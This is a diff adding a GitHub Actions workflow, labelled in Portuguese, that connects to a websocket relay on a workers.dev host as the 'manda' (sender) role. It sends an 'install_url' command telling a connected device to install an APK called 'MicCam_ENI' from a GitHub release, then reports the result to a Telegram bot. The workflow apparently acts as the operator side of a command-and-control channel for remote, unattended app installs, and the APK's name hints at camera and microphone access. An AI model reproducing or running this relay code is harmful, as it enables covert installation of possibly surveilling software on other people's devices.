@@ -1,0 +1,39 @@
+name: GH-KALI Manda Install
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  manda:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Manda install_url pelo relay
+        run: |
+          pip install -q websocket-client
+          python3 - <<'PY'
+          import json, time
+          import websocket
+          URL = "wss://sino-relay.worldeffects752.workers.dev/ws?id=g52"
+          ws = websocket.create_connection(URL, header=["X-Role: manda"], timeout=30)
+          ws.settimeout(10)
+          fim = time.time() + 90
+          mandou = False
+          while time.time() < fim:
+              try:
+                  m = ws.recv()
+              except websocket.WebSocketTimeoutException:
+                  if not mandou:
+                      ws.send(json.dumps({"cmd": "install_url", "url": "https://github.com/datacfgx/miccam-eni/releases/download/v3.9d/MicCam_ENI_v3.9d.apk"}))
+                      mandou = True
+                      print("[manda] install_url enviado", flush=True)
+                  continue
+              except Exception:
+                  break
+              if m is None: break
+              print("RECV:", str(m)[:250], flush=True)
+          ws.close()
+          PY
+      - name: Aviso no Telegram
+        if: always()
+        run: |
+          curl -s -F text="teste install sem depuração finalizado — veja o log" "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" > /dev/null
